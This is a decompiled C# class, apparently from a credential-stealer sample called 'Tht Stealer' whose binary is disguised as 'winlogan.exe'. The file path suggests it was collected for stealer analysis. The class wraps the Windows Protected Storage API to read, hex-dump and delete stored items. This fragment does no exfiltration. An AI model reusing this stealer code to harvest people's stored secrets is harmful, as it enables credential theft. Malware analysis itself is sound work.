// Decompiled with JetBrains decompiler
// Type: CItem
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using PStoreLib;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

internal class CItem : CUtils
{
  private IPStore m_IPStore;
  private Guid m_Guid;
  private Guid m_SubGuid;
  private string m_Name;
  private PST_KEY m_KeyType;

  public string Name
  {
    get
    {
      return this.m_Name;
    }
  }

  [DebuggerNonUserCode]
  public CItem()
  {
    this.m_Guid = new Guid();
    this.m_SubGuid = new Guid();
  }

  private void FreeStruct(IntPtr ptr)
  {
    Marshal.FreeCoTaskMem(ptr);
  }

  internal void Init(IPStore PStore, PST_KEY KeyType, ref Guid guidType, ref Guid guidSubType, string szItemName)
  {
    this.m_IPStore = PStore;
    this.m_Guid = guidType;
    this.m_SubGuid = guidSubType;
    this.m_Name = szItemName;
    this.m_KeyType = KeyType;
  }

  public void Delete()
  {
    this.m_IPStore.DeleteItem(this.m_KeyType, ref this.m_Guid, ref this.m_SubGuid, this.m_Name, 0, 0);
  }

  public byte[] ReadBinary()
  {
    byte[] destination = (byte[]) null;
    int pcbData;
    IntPtr ppbData;
    this.m_IPStore.ReadItem(this.m_KeyType, ref this.m_Guid, ref this.m_SubGuid, this.m_Name, out pcbData, out ppbData, 0, 0);
    if (ppbData != IntPtr.Zero)
    {
      destination = new byte[checked (pcbData - 1 + 1)];
      Marshal.Copy(ppbData, destination, 0, pcbData);
      this.FreeStruct(ppbData);
    }
    return destination;
  }

  public string ReadBinaryString()
  {
    byte[] numArray = this.ReadBinary();
    StringBuilder stringBuilder = new StringBuilder();
    int num1 = checked (numArray.Length - 1);
    int num2 = 0;
    int num3 = num1;
    int index = num2;
    while (index <= num3)
    {
      stringBuilder.Append(Conversion.Hex(numArray[index]) + " ");
      checked { ++index; }
    }
    return stringBuilder.ToString();
  }
}
